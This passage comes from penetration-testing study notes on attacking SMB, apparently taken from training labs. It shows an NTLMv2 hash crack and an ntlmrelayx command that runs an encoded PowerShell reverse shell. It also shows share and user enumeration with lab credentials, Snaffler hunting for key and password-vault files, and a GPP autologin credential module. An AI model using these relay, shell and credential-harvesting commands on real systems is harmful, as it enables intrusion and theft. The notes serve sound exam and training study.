</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Dictionary cache hit:
</span></span><span style=display:flex><span>* Filename..: /usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span>* Passwords.: 14344386
</span></span><span style=display:flex><span>* Bytes.....: 139921355
</span></span><span style=display:flex><span>* Keyspace..: 14344386
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:010100
</span></span></code></pre></div><p>Â </p><p>NTLM RELAY</p><p>Then we execute <code>impacket-ntlmrelayx</code> with the option <code>--no-http-server</code>, <code>-smb2support</code>, and the target machine with the option <code>-t</code>. By default, <code>impacket-ntlmrelayx</code> will dump the SAM database, but we can execute commands by adding the option <code>-c</code>.</p><p>Attacking SMB</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Running in relay mode to single host
</span></span><span style=display:flex><span>[*] Setting up SMB Server
</span></span><span style=display:flex><span>[*] Setting up WCF Server
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Servers started, waiting for connections
</span></span></code></pre></div><p>Â </p><p>We can create a PowerShell reverse shell using <a href=https://www.revshells.com/ rel=external>https://www.revshells.com/</a>, set our machine IP address, port, and the option Powershell #3 (Base64).</p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Attacking SMB</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBq
</span></span><span style=display:flex><span>sudo ntlmrelayx.py -t smb://192.168.220.146 -smb2support --shell
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h2 id=smbmap>SMBMap</h2><h4 id=smbmap-to-check-access>SMBMap To Check Access</h4><p>Credentialed Enumeration - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>cube111@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
        Disk                                                  	Permissions	Comment
    ----								-----------	-------
    ADMIN$							NO ACCESS	Remote Admin
    C$							NO ACCESS	Default share
    Department Shares					READ ONLY	
    IPC$							READ ONLY	Remote IPC
    NETLOGON						READ ONLY	Logon server share 
    SYSVOL						READ ONLY	Logon server share 
    User Shares						READ ONLY	
    ZZZ_archive						READ ONLY</code></pre></div><h4 id=recursive-list-of-all-directories>Recursive List Of All Directories</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>cube111@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#39;Department Shares&#39; --dir-only

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
        Disk                                                  	Permissions	Comment
    ----								-----------	-------
    Department Shares					READ ONLY</code></pre></div><p>Â </p><p>Â </p><h2 id=rpcclient>rpcclient</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>rpcclient -U &#34;&#34; -N 172.16.5.5</code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>rpcclient $&gt; enumdomusers

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Password finder</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>PS C:\htb&gt; .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

 .::::::.:::.    :::.  :::.    .-:::::&#39;.-:::::&#39;:::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;&#39;&#39;&#39;&#39; ;;;&#39;&#39;&#39;&#39; ;;;    ;;;;&#39;&#39;&#39;&#39; ;;;;``;;;;
&#39;[==/[[[[, [[[[[. &#39;[[ ,[[ &#39;[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[[&#39;
  &#39;&#39;&#39;    $ $$$ &#39;Y$c$$c$$$cc$$$c`$$$&#39;`` `$$$&#39;`` $$&#39;     $$&#34;&#34;   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b &#39;88bo,
  &#39;YMmMY&#39;  MMM     YM YMM   &#39;&#39;` &#39;MM,    &#39;MM,  &#39;&#39;&#39;&#39;YUMMM&#39;&#39;&#39;&#39;YUMMMMMMM   &#39;W&#39;
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler

2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\address)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
2022-03-31 12:17:18 -07:00 [Share] {Green}(\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\CertEnroll)
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.kdb$|289B|3/31/2022 12:09:22 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\GroupBackup.kdb) .kdb
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.key$|299B|3/31/2022 12:05:33 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ShowReset.key) .key
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\UpdateServicesPackages)
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.kwallet$|302B|3/31/2022 12:04:45 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WriteUse.kwallet) .kwallet
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.key$|298B|3/31/2022 12:05:10 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ProtectStep.key) .key
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.ppk$|275B|3/31/2022 12:04:40 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\StopTrace.ppk) .ppk
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.key$|301B|3/31/2022 12:09:17 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WaitClear.key) .key
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.sqldump$|312B|3/31/2022 12:05:30 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\DenyRedo.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.sqldump$|310B|3/31/2022 12:05:02 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\AddPublish.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\WsusContent)
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.keychain$|295B|3/31/2022 12:08:42 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\SetStep.keychain) .keychain
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.tblk$|279B|3/31/2022 12:05:25 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FindConnect.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.psafe3$|301B|3/31/2022 12:09:33 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\GetUpdate.psafe3) .psafe3
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.keypair$|278B|3/31/2022 12:09:09 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\UnprotectConvertTo.keypair) .keypair
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.tblk$|280B|3/31/2022 12:05:17 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\ExportJoin.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.mdf$|305B|3/31/2022 12:09:27 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FormatShow.mdf) .mdf
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.mdf$|299B|3/31/2022 12:09:14 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\LockConfirm.mdf) .mdf

&lt;SNIP&gt;</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>cube111@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</p><p>SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)<br>SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2<br>GPP_AUTO&mldr; 172.16.5.5 445 ACADEMY-EA-DC01 [+] Found SYSVOL share<br>GPP_AUTO&mldr; 172.16.5.5 445 ACADEMY-EA-DC01 [*] Searching for Registry.xml<br>GPP_AUTO&mldr; 172.16.5.5 445 ACADEMY-EA-DC01 [*] Found INLANEFREIGHT.LOCAL/Polic</p><p>Â </p><p>SMB GHOST</p><h4 id=nitiation-of-the-attack>NITIATION of the Attack</h4><table><thead><tr><th><strong>Step</strong></th><th><strong>SMBGhost</strong></th><th><strong>Concept of Attacks - Category</strong></th></tr></thead><tbody><tr><td><code>1.</code></td><td>The client sends a request manipulated by the attacker to the SMB server.</td><td><code>Source</code></td></tr><tr><td><code>2.</code></td><td>The sent compressed packets are processed according to the negotiated protocol responses.</td><td><code>Process</code></td></tr><tr><td><code>3.</code></td><td>This process is performed with the system's privileges or at least with the privileges of an administrator.</td><td><code>Privileges</code></td></tr><tr><td><code>4.</code></td><td>The local process is used as the destination, which should process these compressed packets.</td><td><code>Destination</code></td></tr></tbody></table><p>This is when the cycle starts all over again, but this time to gain remote access to the target system.</p><h4 id=trigger-remote-code-execution>Trigger Remote Code Execution</h4><table><thead><tr><th><strong>Step</strong></th><th><strong>SMBGhost</strong></th><th><strong>Concept of Attacks - Category</strong></th></tr></thead><tbody><tr><td><code>5.</code></td><td>The sources used in the second cycle are from the previous process.</td><td><code>Source</code></td></tr><tr><td><code>6.</code></td><td>In this process, the integer overflow occurs by replacing the overwritten buffer with the attacker's instructions and forcing the CPU to execute those instructions.</td><td><code>Process</code></td></tr><tr><td><code>7.</code></td><td>The same privileges of the SMB server are used.</td><td><code>Privileges</code></td></tr><tr><td><code>8.</code></td><td>The remote attacker system is used as the destination, in this case, granting access to the local system.</td><td><code>Destination</code></td></tr></tbody></table><p>However, despite the vulnerability's complexity due to the buffer's manipulation, which we can see in the <a href=https://www.exploit-db.com/exploits/48537 rel=external>PoC</a>, the concept of the attack nevertheless applies here.</p><footer class=footline></footer></article></div></main></div><aside id=R-sidebar class=default-animation><div id=R-header-topbar class=default-animation></div><div id=R-header-wrapper class=default-animation><div id=R-header class=default-animation><a id=R-logo class=R-default href=../../><div class=logo-title style=display:flex;align-items:center><img src=../../images/logo.png alt=Logo style=width:90px;height:80>
<span>DrakonOps</span></div></a></div><search><form action=../../search/index.html method=get><div class="searchbox default-animation"><button class=search-detail type=submit title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
<label class=a11y-only for=R-search-by>Search</label>
<input data-search-input id=R-search-by name=search-by class=search-by type=search placeholder=Search...>
<button class=search-clear type=button data-search-clear title="Clear search"><i class="fas fa-times" title="Clear search"></i></button></div></form></search></div><div id=R-homelinks class="default-animation homelinks"><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-homelinks"><ul class="space collapsible-menu"><li data-nav-url=../../index.html><a class=padding href=../../index.html><i class="fa-fw fas fa-home"></i> Home</a></li></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-headercontrols"><ul></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div></div><div id=R-content-wrapper class=highlightable><div class="R-sidebarmenu R-shortcutmenu-main"><ul class="enlarge morespace collapsible-menu"><li class=parent data-nav-url=../../oscp-notes/index.html><input type=checkbox id=R-section-5f51e3ac21bcc264f305c28eac7484ea aria-controls=R-subsections-5f51e3ac21bcc264f305c28eac7484ea checked><label for=R-section-5f51e3ac21bcc264f305c28eac7484ea><i class="fa-fw fas fa-chevron-right"></i><span class=a11y-only>Submenu OSCP Notes</span></label><a class=padding href=../../oscp-notes/index.html>OSCP Notes<i class="fa-fw fas fa-check read-icon"></i></a><ul id=R-subsections-5f51e3ac21bcc264f305c28eac7484ea class=collapsible-menu><li data-nav-url=../../oscp-notes/main-methodology/index.html><a class=padding href=../../oscp-notes/main-methodology/index.html>main methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/methodology/index.html><a class=padding href=../../oscp-notes/methodology/index.html>methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/project/index.html><a class=padding href=../../oscp-notes/project/index.html>project<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html><a class=padding href=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html>footprinting and finger printing web apps<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nmap/index.html><a class=padding href=../../oscp-notes/nmap/index.html>nmap<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/go-busters/index.html><a class=padding href=../../oscp-notes/go-busters/index.html>Go busters<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/dns/index.html><a class=padding href=../../oscp-notes/dns/index.html>dns<i class="fa-fw fas fa-check read-icon"></i></a></li><li class=active data-nav-url=../../oscp-notes/smb/index.html><a class=padding href=../../oscp-notes/smb/index.html>smb<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nfs/index.html><a class=padding href=../../oscp-notes/nfs/index.html>nfs<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ftp/index.html><a class=padding href=../../oscp-notes/ftp/index.html>ftp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/smtp/index.html><a class=padding href=../../oscp-notes/smtp/index.html>smtp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/snmp/index.html><a class=padding href=../../oscp-notes/snmp/index.html>snmp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/imap-and-pop/index.html><a class=padding href=../../oscp-notes/imap-and-pop/index.html>imap and pop<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/mssql/index.html><a class=padding href=../../oscp-notes/mssql/index.html>mssql<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/oracle-databases-tns/index.html><a class=padding href=../../oscp-notes/oracle-databases-tns/index.html>oracle databases TNS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ipmi/index.html><a class=padding href=../../oscp-notes/ipmi/index.html>IPMI<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/vhosts/index.html><a class=padding href=../../oscp-notes/vhosts/index.html>vhosts<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/web-attacks/index.html><a class=padding href=../../oscp-notes/web-attacks/index.html>Web Attacks<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/xss/index.html><a class=padding href=../../oscp-notes/xss/index.html>XSS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/login-brute-force-wordlists/index.html><a class=padding href=../../oscp-notes/login-brute-force-wordlists/index.html>login brute force wordlists<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/crackmapexec/index.html><a class=padding href=../../oscp-notes/crackmapexec/index.html>crackmapexec<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/eum4linux/index.html><a class=padding href=../../oscp-notes/eum4linux/index.html>eum4linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rpcclient/index.html><a class=padding href=../../oscp-notes/rpcclient/index.html>rpcclient<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/spwaning-shell/index.html><a class=padding href=../../oscp-notes/spwaning-shell/index.html>spwaning shell<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-windows/index.html><a class=padding href=../../oscp-notes/file-transfers-windows/index.html>File transfers windows<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html><a class=padding href=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html>file transfer using nc_ncat and rdp_winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/living-off-the-land-file-transfer/index.html><a class=padding href=../../oscp-notes/living-off-the-land-file-transfer/index.html>living off the land file transfer<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/transferring-files-with-code/index.html><a class=padding href=../../oscp-notes/transferring-files-with-code/index.html>Transferring Files with Code<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/privilige-escalation/index.html><a class=padding href=../../oscp-notes/privilige-escalation/index.html>privilige escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/linux-privilege-escalation/index.html><a class=padding href=../../oscp-notes/linux-privilege-escalation/index.html>linux privilege escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/windows-privilege-escalation/index.html><a class=padding href=../../oscp-notes/windows-privilege-escalation/index.html>Windows Privilege Escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/pivoting_tunneling/index.html><a class=padding href=../../oscp-notes/pivoting_tunneling/index.html>Scanning the Pivot Target<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/the-active-directory/index.html><a class=padding href=../../oscp-notes/the-active-directory/index.html>The Active Directory<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/the-metasploit-framework/index.html><a class=padding href=../../oscp-notes/the-metasploit-framework/index.html>The Metasploit Framework<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/linux-remote-management/index.html><a class=padding href=../../oscp-notes/linux-remote-management/index.html>Linux Remote Management<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rdp-and-windows-remote-management/index.html><a class=padding href=../../oscp-notes/rdp-and-windows-remote-management/index.html>RDP and winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-linux/index.html><a class=padding href=../../oscp-notes/file-transfers-linux/index.html>File transfers Linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/password-attacks/index.html><a class=padding href=../../oscp-notes/password-attacks/index.html>password attacks<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li></ul></div><div class="R-sidebarmenu R-shortcutmenu-shortcuts"><ul class="space collapsible-menu"></ul></div><div id=R-footer-margin></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-footercontrols"><ul><li class=R-historyclearer><div class="padding menu-control"><i class="fa-fw fas fa-history"></i>
<span>&nbsp;</span><div class=control-style><button>Clear History</button></div><div class=clear></div></div></li></ul></div><div id=R-footer><p>Built with <a href=https://github.com/McShelby/hugo-theme-relearn title=love><i class="fas fa-heart"></i></a> by <a href=https://gohugo.io/>Hugo</a></p></div></div></aside><script src=../../js/js-yaml/js-yaml.min.js?1762046208 defer></script><script src=../../js/d3/d3-color.min.js?1762046208 defer></script><script src=../../js/d3/d3-dispatch.min.js?1762046208 defer></script><script src=../../js/d3/d3-drag.min.js?1762046208 defer></script><script src=../../js/d3/d3-ease.min.js?1762046208 defer></script><script src=../../js/d3/d3-interpolate.min.js?1762046208 defer></script><script src=../../js/d3/d3-selection.min.js?1762046208 defer></script><script src=../../js/d3/d3-timer.min.js?1762046208 defer></script><script src=../../js/d3/d3-transition.min.js?1762046208 defer></script><script src=../../js/d3/d3-zoom.min.js?1762046208 defer></script><script src=../../js/mermaid/mermaid.min.js?1762046208 defer></script><script>window.relearn.themeUseMermaid=JSON.parse("{}")</script><script src=../../js/clipboard/clipboard.min.js?1762046208 defer></script><script src=../../js/perfect-scrollbar/perfect-scrollbar.min.js?1762046208 defer></script><script src=../../js/theme.min.js?1762046208 defer></script></body></html>